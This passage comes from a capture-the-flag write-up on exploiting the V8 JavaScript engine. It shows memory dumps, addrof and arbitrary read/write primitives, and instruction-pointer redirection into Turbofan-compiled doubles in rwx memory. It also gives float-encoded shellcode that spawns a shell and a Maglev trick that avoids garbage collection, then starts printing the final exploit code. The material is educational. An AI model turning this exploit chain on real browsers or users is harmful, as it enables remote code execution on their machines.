0x2d7a0020077c: 0xc905f8310a0dc902  0x450313ca07f8f965
0x2d7a0020078c: 0x0000059500af02f9  0x001d48f500000012
0x2d7a0020079c: 0x001d4901001d33ed  0x001d4921001d4911
0x2d7a002007ac: 0x001d3595001d33fd  0x001d4931001d3581
0x2d7a002007bc: 0x000000b400000949  0x00000000001d4941
0x2d7a002007cc: 0x0020079100180011  0x0000001000000028
0x2d7a002007dc: 0x2500007e00000000  0x13c7010121c80cca
0x2d7a002007ec: 0xf93703f5f665c602  0x010121c8010d05f7</div>
<div class="jsMemTitle">GDB [0x5555b7941700]<div class="jsMemSep"></div></div>
	<div class="jsMemHex">0x5555b7941700: 0x43f6de0349f4598b  0xa0035ef0850f201e
0x5555b7941710: 0x48505756e5894855  0x0fa0653b4908ec83
0x5555b7941720: 0x266eb80000001f86  0x8b48e84d8b480000
0x5555b7941730: 0x037f01f983485de5  0x248d485a410008c2
0x5555b7941740: 0x000030bac35241cc  0xbb48e07589485200
0x5555b7941750: 0x0000555556d0ccf0  0x05ba4800000001b8
0x5555b7941760: 0x4800002d7a001c02  0xb8a00d1851e8f28b
0x5555b7941770: 0x4190b4eb0000266e  0x0000000190d855ff
0x5555b7941780: 0x0178016f00000491  0x0000000000000000
0x5555b7941790: 0x0000000000000000  0x0000000000000000
0x5555b79417a0: 0x0000000000000000  0x0000000000000000
0x5555b79417b0: 0x0000000000000000  0x0000000000000000</div>
</div>

Awesome, we have a code object that points to an address where the code gets run from, and we can change it to whatever we want. Let's make a part of the memory just the [0xCC INT3](https://en.wikipedia.org/wiki/INT_%28x86_instruction%29#INT3) breakpoint opcode - this will temporarily pause the execution and send a [SIGTRAP signal](https://en.wikipedia.org/wiki/Signal_%28IPC%29#SIGTRAP) to gdb so we can look into the current state.

```js
> funcAddr = addrof(func)
> hex32(funcAddr)
< '0x001d3fb9n'
> codeAddr = read(funcAddr + 0x8n) >> 32n
> hex32(codeAddr)
< '0x002006ed'
> instructionStart = codeAddr + 0x14n
> hex64(read(instructionStart))
< '0x00005555b7941700'
> instructions = [i2f(0xCCCCCCCCCCCCCCCCn), 2.2]
> instructions
< [-9.255963134931783e+61, 2.2]
> write(instructionStart, 0x2d7a00000000n + addrof(instructions) - 0x10n);
> func()
Received signal 11 SEGV_ACCERR 2d7a00050061
Segmentation fault (core dumped)
```

Huh, that didn't work, why is that?

The `SEGV_ACCERR` signal gives us a hint - it means that there was some sort of a permissions error accessing the memory map. It turns out not all memory is made equal and different parts of the memory have different permissions. In Linux we can see this by looking at the map of a process.

<div class="termCode"><span class="termCodeW">$ ./d8 &amp;</span> <span class="termCodeComm">&lt;-- run d8 in the background</span>
[1] 1962 <span class="termCodeComm">&lt;-- that's the d8 process id</span>
<span class="termCodeW">$</span> V8 version 12.7.0 (candidate)
d8> 
[1]+  Stopped                 ./d8
<span class="termCodeW">$ cat /proc/1962/maps</span> <span class="termCodeComm">&lt;-- look at the process map</span>
a6b00000000-1a6b00010000 <span class="termCodePr">r--p</span> <span class="over800">00000000 00:00 0</span>
1a6b00010000-1a6b00020000 <span class="termCodePp">---p</span> <span class="over800">00000000 00:00 0</span>
1a6b00020000-1a6b00040000 <span class="termCodePr">r--p</span> <span class="over800">00000000 00:00 0</span>
1a6b00040000-1a6b00143000 <span class="termCodePw">rw-p</span> <span class="over800">00000000 00:00 0</span>
1a6b00143000-1a6b00180000 <span class="termCodePp">---p</span> <span class="over800">00000000 00:00 0</span>
1a6b00180000-1a6b00181000 <span class="termCodePw">rw-p</span> <span class="over800">00000000 00:00 0</span>
1a6b00181000-1a6b001c0000 <span class="termCodePp">---p</span> <span class="over800">00000000 00:00 0</span>
1a6b001c0000-1a6b00200000 <span class="termCodePw">rw-p</span> <span class="over800">00000000 00:00 0</span>
1a6b00200000-1a6b00300000 <span class="termCodePp">---p</span> <span class="over800">00000000 00:00 0</span>
1a6b00300000-1a6b00316000 <span class="termCodePr">r--p</span> <span class="over800">00000000 00:00 0</span>
1a6b00316000-1a6b00340000 <span class="termCodePp">---p</span> <span class="over800">00000000 00:00 0</span>
1a6b00340000-1a6c00000000 <span class="termCodePp">---p</span> <span class="over800">00000000 00:00 0</span>
55987ab85000-55987bcc3000 <span class="termCodePr">r--p</span> <span class="over800">00000000 08:01 1356475                   </span>&nbsp;/home/lyra/Desktop/array.xor/dist/d8
55987bcc4000-55987d35e000 <span class="termCodePx">r-xp</span> <span class="over800">0113e000 08:01 1356475                   </span>&nbsp;/home/lyra/Desktop/array.xor/dist/d8
55987d35e000-55987d3df000 <span class="termCodePr">r--p</span> <span class="over800">027d7000 08:01 1356475                   </span>&nbsp;/home/lyra/Desktop/array.xor/dist/d8
55987d3e0000-55987d3ec000 <span class="termCodePw">rw-p</span> <span class="over800">02858000 08:01 1356475                   </span>&nbsp;/home/lyra/Desktop/array.xor/dist/d8
55987d3ec000-55987d3ed000 <span class="termCodePr">r--p</span> <span class="over800">02864000 08:01 1356475                   </span>&nbsp;/home/lyra/Desktop/array.xor/dist/d8
55987d3ed000-55987d3fb000 <span class="termCodePw">rw-p</span> <span class="over800">02865000 08:01 1356475                   </span>&nbsp;/home/lyra/Desktop/array.xor/dist/d8
55987d3fb000-55987d42e000 <span class="termCodePw">rw-p</span> <span class="over800">00000000 00:00 0</span>
55987f17d000-55987f214000 <span class="termCodePw">rw-p</span> <span class="over800">00000000 00:00 0                         </span>&nbsp;[heap]
5598dcf80000-5598fcf80000 <span class="termCodePrwx">rwxp</span> <span class="over800">00000000 00:00 0</span>
7f68b8000000-7f68b8010000 <span class="termCodePr">r--p</span> <span class="over800">00000000 00:00 0</span>
7f68b8010000-7f68d8000000 <span class="termCodePp">---p</span> <span class="over800">00000000 00:00 0</span>
7f68d8000000-7f68d8010000 <span class="termCodePr">r--p</span> <span class="over800">00000000 00:00 0</span>
7f68d8010000-7f68f8000000 <span class="termCodePp">---p</span> <span class="over800">00000000 00:00 0</span>
7f68f8000000-7f68f8010000 <span class="termCodePr">r--p</span> <span class="over800">00000000 00:00 0</span>
7f68f8010000-7f6918000000 <span class="termCodePp">---p</span> <span class="over800">00000000 00:00 0</span>
7f6918000000-7f6918021000 <span class="termCodePw">rw-p</span> <span class="over800">00000000 00:00 0</span>
7f6918021000-7f691c000000 <span class="termCodePp">---p</span> <span class="over800">00000000 00:00 0</span>
7f691c000000-7f691c021000 <span class="termCodePw">rw-p</span> <span class="over800">00000000 00:00 0</span>
7f691c021000-7f6920000000 <span class="termCodePp">---p</span> <span class="over800">00000000 00:00 0</span>
7f6920000000-7f6920021000 <span class="termCodePw">rw-p</span> <span class="over800">00000000 00:00 0</span>
7f6920021000-7f6924000000 <span class="termCodePp">---p</span> <span class="over800">00000000 00:00 0</span>
7f6927dce000-7f6927e1c000 <span class="termCodePw">rw-p</span> <span class="over800">00000000 00:00 0</span>
7f6927e1c000-7f6927e1d000 <span class="termCodePp">---p</span> <span class="over800">00000000 00:00 0</span>
7f6927e1d000-7f692861d000 <span class="termCodePw">rw-p</span> <span class="over800">00000000 00:00 0</span>
7f692861d000-7f692861e000 <span class="termCodePp">---p</span> <span class="over800">00000000 00:00 0</span>
7f692861e000-7f6928e1e000 <span class="termCodePw">rw-p</span> <span class="over800">00000000 00:00 0</span>
7f6928e1e000-7f6928e1f000 <span class="termCodePp">---p</span> <span class="over800">00000000 00:00 0</span>
7f6928e1f000-7f6929623000 <span class="termCodePw">rw-p</span> <span class="over800">00000000 00:00 0</span>
7f6929623000-7f6929647000 <span class="termCodePr">r--p</span> <span class="over800">00000000 08:01 5648200                   </span>&nbsp;/usr/lib/libc.so.6
7f6929647000-7f69297ab000 <span class="termCodePx">r-xp</span> <span class="over800">00024000 08:01 5648200                   </span>&nbsp;/usr/lib/libc.so.6
7f69297ab000-7f69297f9000 <span class="termCodePr">r--p</span> <span class="over800">00188000 08:01 5648200                   </span>&nbsp;/usr/lib/libc.so.6
7f69297f9000-7f69297fd000 <span class="termCodePr">r--p</span> <span class="over800">001d6000 08:01 5648200                   </span>&nbsp;/usr/lib/libc.so.6
7f69297fd000-7f69297ff000 <span class="termCodePw">rw-p</span> <span class="over800">001da000 08:01 5648200                   </span>&nbsp;/usr/lib/libc.so.6
7f69297ff000-7f6929807000 <span class="termCodePw">rw-p</span> <span class="over800">00000000 00:00 0</span>
7f6929807000-7f692980b000 <span class="termCodePr">r--p</span> <span class="over800">00000000 08:01 5641004                   </span>&nbsp;/usr/lib/libgcc_s.so.1
7f692980b000-7f6929826000 <span class="termCodePx">r-xp</span> <span class="over800">00004000 08:01 5641004                   </span>&nbsp;/usr/lib/libgcc_s.so.1
7f6929826000-7f692982a000 <span class="termCodePr">r--p</span> <span class="over800">0001f000 08:01 5641004                   </span>&nbsp;/usr/lib/libgcc_s.so.1
7f692982a000-7f692982b000 <span class="termCodePr">r--p</span> <span class="over800">00022000 08:01 5641004                   </span>&nbsp;/usr/lib/libgcc_s.so.1
7f692982b000-7f692982c000 <span class="termCodePw">rw-p</span> <span class="over800">00023000 08:01 5641004                   </span>&nbsp;/usr/lib/libgcc_s.so.1
7f692982c000-7f692983a000 <span class="termCodePr">r--p</span> <span class="over800">00000000 08:01 5648210                   </span>&nbsp;/usr/lib/libm.so.6
7f692983a000-7f69298b9000 <span class="termCodePx">r-xp</span> <span class="over800">0000e000 08:01 5648210                   </span>&nbsp;/usr/lib/libm.so.6
7f69298b9000-7f6929915000 <span class="termCodePr">r--p</span> <span class="over800">0008d000 08:01 5648210                   </span>&nbsp;/usr/lib/libm.so.6
7f6929915000-7f6929916000 <span class="termCodePr">r--p</span> <span class="over800">000e8000 08:01 5648210                   </span>&nbsp;/usr/lib/libm.so.6
7f6929916000-7f6929917000 <span class="termCodePw">rw-p</span> <span class="over800">000e9000 08:01 5648210                   </span>&nbsp;/usr/lib/libm.so.6
7f6929917000-7f6929918000 <span class="termCodePr">r--p</span> <span class="over800">00000000 08:01 5648228                   </span>&nbsp;/usr/lib/libpthread.so.0
7f6929918000-7f6929919000 <span class="termCodePx">r-xp</span> <span class="over800">00001000 08:01 5648228                   </span>&nbsp;/usr/lib/libpthread.so.0
7f6929919000-7f692991a000 <span class="termCodePr">r--p</span> <span class="over800">00002000 08:01 5648228                   </span>&nbsp;/usr/lib/libpthread.so.0
7f692991a000-7f692991b000 <span class="termCodePr">r--p</span> <span class="over800">00002000 08:01 5648228                   </span>&nbsp;/usr/lib/libpthread.so.0
7f692991b000-7f692991c000 <span class="termCodePw">rw-p</span> <span class="over800">00003000 08:01 5648228                   </span>&nbsp;/usr/lib/libpthread.so.0
7f692991c000-7f692991d000 <span class="termCodePr">r--p</span> <span class="over800">00000000 08:01 5648205                   </span>&nbsp;/usr/lib/libdl.so.2
7f692991d000-7f692991e000 <span class="termCodePx">r-xp</span> <span class="over800">00001000 08:01 5648205                   </span>&nbsp;/usr/lib/libdl.so.2
7f692991e000-7f692991f000 <span class="termCodePr">r--p</span> <span class="over800">00002000 08:01 5648205                   </span>&nbsp;/usr/lib/libdl.so.2
7f692991f000-7f6929920000 <span class="termCodePr">r--p</span> <span class="over800">00002000 08:01 5648205                   </span>&nbsp;/usr/lib/libdl.so.2
7f6929920000-7f6929921000 <span class="termCodePw">rw-p</span> <span class="over800">00003000 08:01 5648205                   </span>&nbsp;/usr/lib/libdl.so.2
7f6929921000-7f6929923000 <span class="termCodePw">rw-p</span> <span class="over800">00000000 00:00 0</span>
7f6929948000-7f6929949000 <span class="termCodePr">r--p</span> <span class="over800">00000000 08:01 5648191                   </span>&nbsp;/usr/lib/ld-linux-x86-64.so.2
7f6929949000-7f6929970000 <span class="termCodePx">r-xp</span> <span class="over800">00001000 08:01 5648191                   </span>&nbsp;/usr/lib/ld-linux-x86-64.so.2
7f6929970000-7f692997a000 <span class="termCodePr">r--p</span> <span class="over800">00028000 08:01 5648191                   </span>&nbsp;/usr/lib/ld-linux-x86-64.so.2
7f692997a000-7f692997c000 <span class="termCodePr">r--p</span> <span class="over800">00032000 08:01 5648191                   </span>&nbsp;/usr/lib/ld-linux-x86-64.so.2
7f692997c000-7f692997e000 <span class="termCodePw">rw-p</span> <span class="over800">00034000 08:01 5648191                   </span>&nbsp;/usr/lib/ld-linux-x86-64.so.2
7ffde1b30000-7ffde1b51000 <span class="termCodePw">rw-p</span> <span class="over800">00000000 00:00 0                         </span>&nbsp;[stack]
7ffde1baf000-7ffde1bb3000 <span class="termCodePr">r--p</span> <span class="over800">00000000 00:00 0                         </span>&nbsp;[vvar]
7ffde1bb3000-7ffde1bb5000 <span class="termCodePx">r-xp</span> <span class="over800">00000000 00:00 0                         </span>&nbsp;[vdso]
ffffffffff600000-ffffffffff601000 <span class="termCodePx">--xp</span> <span class="over800">00000000 00:00 0                 </span>&nbsp;[vsyscall]
<span class="termCodeW">$</span></div>

<style>
.termCodePp {
	color: #444;
}
.termCodePr {
	color: #8e1;
}
.termCodePw {
	color: #EF0;
}
.termCodePx {
	color: #FA0;
}
.termCodePrwx {
	color: #F00;
}
</style>

These are all the memory addresses d8 uses, and each one of them has permissions associated with them - **r**ead, **w**rite, and e**x**ecute respectively. The array we made is in one of the read-write maps, so trying to execute code from there is going to result in a crash.

But how are we going to write data into that one memory map that has the **rwx** permissions? We cannot use our write primitive because it can only write into the lower 32 bits our compressed pointer can access.

I then came across [this awesome writeup by Anvbis](https://anvbis.au/posts/code-execution-in-chromiums-v8-heap-sandbox/) demonstrating how we can use Turbofan to do exactly that through a very clever trick. I'll be borrowing heavily from that post, but it goes a lot more in-depth so please check it out if this sounds interesting.

What Anvbis did was create a function with doubles in it, and those doubles got Turbofan-optimized into bytes in the **rwx** area. They could then offset the instruction start pointer to start execution from those doubles instead of the original code.

Let's see if we can trigger an INT3 breakpoint this way.

```js
> i2f(0xCCCCCCCCCCCCCCCCn)
< -9.255963134931783e+61
> function int3() {
	return [ // i changed every line a little so that the numbers wouldn't get optimized into one
		-9.255963134931783e+61,
		-9.255963134931784e+61,
		-9.255963134931785e+61,
		-9.255963134931786e+61,
		-9.255963134931787e+61,
		-9.255963134931788e+61,
		-9.255963134931789e+61,
		-9.255963134931780e+61,
	]
}
> int3()
> %PrepareFunctionForOptimization(int3)
> int3()
> %OptimizeFunctionOnNextCall(int3)
> int3()
> funcAddr = addrof(int3)
> codeAddr = read(funcAddr + 0x8n) >> 32n
> instructionStart = codeAddr + 0x14n
> hex64(read(instructionStart))
< '0x00005555b7941b00'
> ^Z
Thread 1 "d8" received signal SIGTSTP, Stopped (user).
(gdb) x/32xg 0x00005555b7941b00
0x5555b7941b00: 0x43f6de0349f4598b 0xa0035af0850f201e
0x5555b7941b10: 0x48505756e5894855 0x0fa0653b4908ec83
0x5555b7941b20: 0x4d8b490000010186 0x7d394958798d4848
0x5555b7941b30: 0x480000011f860f50 0x48487d894948798d
0x5555b7941b40: 0x08a9ff41c701c183 0x0000100341c70000
0x5555b7941b50: 0xccccccccccba4900 0xc26ef9c1c4cccccc
0x5555b7941b60: 0xcdba49074111fbc5 0xc4cccccccccccccc
0x5555b7941b70: 0x4111fbc5c26ef9c1 0xccccccccceba490f
0x5555b7941b80: 0xc26ef9c1c4cccccc 0xcfba49174111fbc5
0x5555b7941b90: 0xc4cccccccccccccc 0x4111fbc5c26ef9c1
0x5555b7941ba0: 0xba49274111fbc51f 0xccccccccccccccd0
0x5555b7941bb0: 0x11fbc5c26ef9c1c4 0xccccccd1ba492f41
0x5555b7941bc0: 0x6ef9c1c4cccccccc 0xba49374111fbc5c2
0x5555b7941bd0: 0xccccccccccccccc9 0x11fbc5c26ef9c1c4
0x5555b7941be0: 0x894d10478d4c3f41 0xb84101c783484845
0x5555b7941bf0: 0xff478944001cb7c5 0x89000007250347c7
(gdb) c
Continuing.
> write(instructionStart, read(instructionStart) + 0x53n);
> int3()
Thread 1 "d8" received signal SIGTRAP, Trace/breakpoint trap.
0x00005555b7941b36 in ?? ()
(gdb)
```

Perfect! We found the place in the rwx memory our 0xCC instruction got put in, and then successfully redirected the execution to that point. The only problem is that our doubles in the memory are not directly one after another - there's some other instructions in-between and we must deal with it somehow.

The solution to that is creating some very special shellcode that carefully jumps from one double to the next in a way where our code is the only code getting executed. [Anvbis' writeup](https://anvbis.au/posts/code-execution-in-chromiums-v8-heap-sandbox/) does a way better job of explaining this than I ever could, so go check it out!

<div class="jsConsole" style="margin-bottom: 4px">
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConKw">function</span> <span class="jsConIdx">shellcode</span><span style="white-space: pre-wrap">() {
     <span class="jsConKw">return</span> [
       <span class="jsConValIn">1.9711828979523134e-246</span>,
       <span class="jsConValIn">1.9562205631094693e-246</span>,
       <span class="jsConValIn">1.9557819155246427e-246</span>,
       <span class="jsConValIn">1.9711824228871598e-246</span>,
       <span class="jsConValIn">1.971182639857203e-246</span>,
       <span class="jsConValIn">1.9711829003383248e-246</span>,
       <span class="jsConValIn">1.9895153920223886e-246</span>,
       <span class="jsConValIn">1.971182898881177e-246</span>
     ]
   }</span></div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConVar">shellcode</span>()</div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg>%<span class="jsConV8">PrepareFunctionForOptimization</span>(<span class="jsConVar">shellcode</span>)</div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConVar">shellcode</span>()</div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg>%<span class="jsConV8">OptimizeFunctionOnNextCall</span>(<span class="jsConVar">shellcode</span>)</div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConVar">shellcode</span>()</div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConVar">funcAddr</span> = <span class="jsConVar">addrof</span>(<span class="jsConVar">shellcode</span>)</div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConVar">codeAddr</span> = <span class="jsConVar">read</span>(<span class="jsConVar">funcAddr</span> + <span class="jsConValIn">0x8n</span>) &gt;&gt; <span class="jsConValIn">32n</span></div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConVar">instructionStart</span> = <span class="jsConVar">codeAddr</span> + <span class="jsConValIn">0x14n</span></div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConVar">write</span>(<span class="jsConVar">instructionStart</span>, <span class="jsConVar">read</span>(<span class="jsConVar">instructionStart</span>) + <span class="jsConValIn">0x53n</span>)</div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConVar">shellcode</span>()</div>
	<div class="jsConBorder"></div>
	<div class="jsConLine jsConTerm"><span style="color:var(--lyreGold)">lyra@horse</span>:<span style="color:#F00">~</span>$ whoami
lyra
<span style="color:var(--lyreGold)">lyra@horse</span>:<span style="color:#F00">~</span>$ fortune
You have a deep interest in all that is artistic.
<span style="color:var(--lyreGold)">lyra@horse</span>:<span style="color:#F00">~</span>$</div>
</div>
<!-- i was rerunning the commands to see how i should style it in the css and i got that fortune ^^ -->

**We got shell!!!** We're almost there, except...

## Part 5: Please don't collect the garbage

We're still reliant on the **%PrepareFunctionForOptimization()** and **%OptimizeFunctionOnNextCall()** debug functions. We can't use them in the actual CTF, so let's try to replace them.

We want to somehow tell V8 to optimize our function with Turbofan, and the easiest way to accomplish that is to just run our function a lot of times, let's give it a shot!

<div class="jsConsole" style="margin-bottom: 4px">
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConKw">for</span> (<span class="jsConKw">let</span> <span class="jsConIdx">i</span> = <span class="jsConValIn">0</span>; <span class="jsConVar">i</span> &lt; <span class="jsConValIn">10000</span>; <span class="jsConVar">i</span>++) <span class="jsConVar">shellcode</span>();</div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg>%<span class="jsConV8">DebugPrint</span>(<span class="jsConVar">shellcode</span>)</div>
	<div class="jsConBorder"></div>
	<div class="jsConLine jsConTerm">DebugPrint: 0x128c001d3e95: [Function] in OldSpace
 - code: 0x128c00032cc1 &lt;Code BUILTIN InterpreterEntryTrampoline&gt;</div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConKw">for</span> (<span class="jsConKw">let</span> <span class="jsConIdx">i</span> = <span class="jsConValIn">0</span>; <span class="jsConVar">i</span> &lt; <span class="jsConValIn">100000</span>; <span class="jsConVar">i</span>++) <span class="jsConVar">shellcode</span>();</div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg>%<span class="jsConV8">DebugPrint</span>(<span class="jsConVar">shellcode</span>)</div>
	<div class="jsConBorder"></div>
	<div class="jsConLine jsConTerm">DebugPrint: 0x128c001d3e95: [Function] in OldSpace
 - code: 0x128c0020051d &lt;Code MAGLEV&gt;</div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConKw">for</span> (<span class="jsConKw">let</span> <span class="jsConIdx">i</span> = <span class="jsConValIn">0</span>; <span class="jsConVar">i</span> &lt; <span class="jsConValIn">1000000</span>; <span class="jsConVar">i</span>++) <span class="jsConVar">shellcode</span>();</div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg>%<span class="jsConV8">DebugPrint</span>(<span class="jsConVar">shellcode</span>)</div>
	<div class="jsConBorder"></div>
	<div class="jsConLine jsConTerm">DebugPrint: 0x128c001d3e95: [Function] in OldSpace
 - code: 0x128c00200ad9 &lt;Code TURBOFAN&gt;</div>
</div>

Yay, we got our Turbofan code without having to use the debug function stuff! Now let's try running the exploit again.

<div class="termCode"><span class="termCodeW">$ gdb --args ./d8 exploit.js</span>
GNU gdb (GDB) 14.2
<span class="termCodeW">(gdb) run</span>
[Thread 0x7ffff74986c0 (LWP 3563) exited]
[Thread 0x7ffff6c976c0 (LWP 3564) exited]
[Thread 0x7ffff7c996c0 (LWP 3562) exited]
[Inferior 1 (process 3559) exited normally]
<span class="termCodeW">(gdb)</span></div>

huh... that didn't work?

Let's try again with some debug logging and the `--trace-gc` flag added.

<div class="termCode"><span class="termCodeW">$ gdb --args ./d8 --trace-gc --allow-natives-syntax exploit.js</span>
GNU gdb (GDB) 14.2
<span class="termCodeW">(gdb) run</span>
Optimizing shellcode() into TURBOFAN
[3735:0x555557e0a000]       61 ms: Scavenge 1.1 (1.8) -> 0.1 (2.8) MB, pooled: 0 MB, 14.69 / 0.00 ms  (average mu = 1.000, current mu = 1.000) allocation failure; 
[3735:0x555557e0a000]       79 ms: Scavenge 1.1 (3.0) -> 0.1 (3.0) MB, pooled: 0 MB, 16.18 / 0.00 ms  (average mu = 1.000, current mu = 1.000) allocation failure; 
[3735:0x555557e0a000]       96 ms: Scavenge 1.1 (3.0) -> 0.1 (3.0) MB, pooled: 0 MB, 16.78 / 0.00 ms  (average mu = 1.000, current mu = 1.000) allocation failure; 
[3735:0x555557e0a000]      111 ms: Scavenge 1.1 (3.0) -> 0.1 (3.0) MB, pooled: 0 MB, 14.87 / 0.00 ms  (average mu = 1.000, current mu = 1.000) allocation failure; 
[3735:0x555557e0a000]      123 ms: Scavenge 1.1 (3.0) -> 0.1 (3.0) MB, pooled: 0 MB, 11.77 / 0.00 ms  (average mu = 1.000, current mu = 1.000) allocation failure; 
[3735:0x555557e0a000]      136 ms: Scavenge 1.1 (3.0) -> 0.1 (3.0) MB, pooled: 0 MB, 12.39 / 0.00 ms  (average mu = 1.000, current mu = 1.000) allocation failure; 
[3735:0x555557e0a000]      155 ms: Scavenge 1.1 (3.0) -> 0.1 (3.0) MB, pooled: 0 MB, 18.08 / 0.00 ms  (average mu = 1.000, current mu = 1.000) allocation failure; 
[3735:0x555557e0a000]      177 ms: Scavenge 1.1 (3.0) -> 0.1 (3.0) MB, pooled: 0 MB, 9.98 / 0.00 ms  (average mu = 1.000, current mu = 1.000) allocation failure; 
[3735:0x555557e0a000]      185 ms: Scavenge 1.1 (3.0) -> 0.1 (3.0) MB, pooled: 0 MB, 7.04 / 0.00 ms  (average mu = 1.000, current mu = 1.000) allocation failure; 
[3735:0x555557e0a000]      191 ms: Scavenge 1.1 (3.0) -> 0.1 (3.0) MB, pooled: 0 MB, 6.31 / 0.00 ms  (average mu = 1.000, current mu = 1.000) allocation failure; 
DebugPrint: 0x298a001d4011: [Function] in OldSpace
 - code: 0x39bb002005e5 &lt;Code TURBOFAN&gt;
funcAddr: 0x00043999
codeAddr: 0x00000725
instructionStart: 0x00000725
Writing shellcode
Running shellcode
[Thread 0x7ffff74986c0 (LWP 3739) exited]
[Thread 0x7ffff6c976c0 (LWP 3740) exited]
[Thread 0x7ffff7c996c0 (LWP 3738) exited]
[Inferior 1 (process 3735) exited normally]
<span class="termCodeW">(gdb)</span></div>

Hmm, so our code gets optimized into Turbofan just fine, but the funcAddr is all wrong! It seems like the *for loop* causes the garbage collector to run, and what the garbage collector does it look at all the stuff in the memory and rearrange it to look nicer. More specifically, [it identifies objects no longer in use, removes them, and also defragments the memory](https://v8.dev/blog/trash-talk).

What this means for us is that it takes our cool oob array and all the other stuff we've set up and throws it all over the place! Our primitives no longer work. In my original exploit at the CTF I fought hard against the GC and eventually found a setup that worked regardless, but it was a bit unreliable. Wouldn't it be nice if we could somehow optimize our function without causing a GC?

I wasn't able to find a way to do this with Turbofan, but perhaps we could try out that Maglev thing we ignored earlier? It's output is a bit different, so we'll have to change our offsets, but it should still work the same.

With that added, **we have our final exploit code**.

<div class="jsConsole">
	<div class="jsConCode"><span class="jsConNull">// set up helper stuff</span>
<span class="jsConKw">const</span> <span class="jsConIdx">buffer</span> = <span class="jsConKw">new</span> <span class="jsConVar">ArrayBuffer</span>(<span class="jsConValIn">8</span>);
<span class="jsConKw">const</span> <span class="jsConIdx">floatBuffer</span> = <span class="jsConKw">new</span> <span class="jsConVar">Float64Array</span>(<span class="jsConVar">buffer</span>);
<span class="jsConKw">const</span> <span class="jsConIdx">int64Buffer</span> = <span class="jsConKw">new</span> <span class="jsConVar">BigUint64Array</span>(<span class="jsConVar">buffer</span>);
<!---->
<span class="jsConNull">// bigint to double</span>
<span class="jsConKw">function</span> <span class="jsConIdx">i2f</span>(<span class="jsConIdx">i</span>) {
  <span class="jsConVar">int64Buffer</span>[<span class="jsConValIn">0</span>] = <span class="jsConVar">i</span>;
  <span class="jsConKw">return</span> <span class="jsConVar">floatBuffer</span>[<span class="jsConValIn">0</span>];
}
<!---->
<span class="jsConNull">// double to bigint</span>
<span class="jsConKw">function</span> <span class="jsConIdx">f2i</span>(<span class="jsConIdx">f</span>) {
  <span class="jsConVar">floatBuffer</span>[<span class="jsConValIn">0</span>] = <span class="jsConVar">f</span>;
  <span class="jsConKw">return</span> <span class="jsConVar">int64Buffer</span>[<span class="jsConValIn">0</span>];
}
<!---->
<span class="jsConNull">// bigint to 32-bit hex string</span>
<span class="jsConKw">function</span> <span class="jsConIdx">hex32</span>(<span class="jsConIdx">i</span>) {
